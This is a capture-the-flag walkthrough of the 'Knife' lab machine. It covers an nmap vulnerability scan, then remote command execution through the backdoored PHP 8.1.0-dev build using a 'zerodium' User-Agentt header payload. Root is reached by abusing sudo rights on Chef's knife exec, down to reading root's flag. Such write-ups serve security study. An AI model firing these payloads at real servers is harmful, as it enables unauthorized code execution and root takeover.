# Knife


## Nmap

After removing irrelevant OSes (Redhat, Huawei, FreeBSD, OpenBSD, Gentoo)
and older exploits:

```bash
nmap -sV -A -p 80,22 --script vuln 10.10.10.242
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:8.2p1:
|     	CVE-2020-15778	6.8	https://vulners.com/cve/CVE-2020-15778
|     	CVE-2020-12062	5.0	https://vulners.com/cve/CVE-2020-12062
|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners:
|   cpe:/a:apache:http_server:2.4.41:
|     	MSF:ILITIES/UBUNTU-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2020-11984/	*EXPLOIT*
|     	CVE-2020-11984	7.5	https://vulners.com/cve/CVE-2020-11984
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/	*EXPLOIT*
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11993/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11993/	*EXPLOIT*
|_    	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993

```

## CVE?

Very little is running on the server:

- the webpage is static
- there's no common directory exposed
- only 2 services open

So, one technology among the following must have a known exploit:

- Ubuntu
- PHP 8.1.0-dev
- openssh 8.2p1
- Apache httpd 2.4.41

After another round of quick sifting we're left with:

- openssh:
  - CVE-2020-15778	6.8	https://vulners.com/cve/CVE-2020-15778
- httpd:
  - CVE-2020-11984	7.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2020-11984/

And after even more googling, the actual vector is a pure backdoor in PHP!

In retrospect, the most eye-catching information was the PHP version: 8.1.0-dev.
Dev builds are rarely found in production, and in every challenge the package
with a specific, outdated, version is there for a reason!

> always always

## Foothold

The back evaluates any string in the HTTP headers following `zerodium`:

```
User-Agentt: zerodiumsystem("id");
```

```
uid=1000(james) gid=1000(james) groups=1000(james)
```

## Escalation

The current user can run `/usr/bin/knife` with root privileges.

```ruby
unless defined?(Bundler) && Bundler.instance_variable_defined?("@load")
  ENV["GEM_HOME"] = ENV["GEM_PATH"] = nil unless ENV["APPBUNDLER_ALLOW_RVM"] == "true"
  ::Gem.clear_paths
  spec = Gem::Specification.find_by_name("chef", "= 16.10.8")
else
  spec = Gem::Specification.find_by_name("chef")
end

unless Gem::Specification.unresolved_deps.empty?
  $stderr.puts "APPBUNDLER WARNING: unresolved deps are CRITICAL performance bug, this MUST be fixed"
  Gem::Specification.reset
end

bin_file = spec.bin_file("knife")

Kernel.load(bin_file)
```

IE this lets us use the chef's knife, with:

```
User-Agentt: zerodiumsystem("sudo /usr/bin/knife");
```

Then breakout with the knife and execute a system call:

```
User-Agentt: zerodiumsystem("sudo /usr/bin/knife exec -E 'exec \"id\"'");

User-Agentt: zerodiumsystem("sudo /usr/bin/knife exec -E 'exec \"cat /root/root.txt\"'");
```
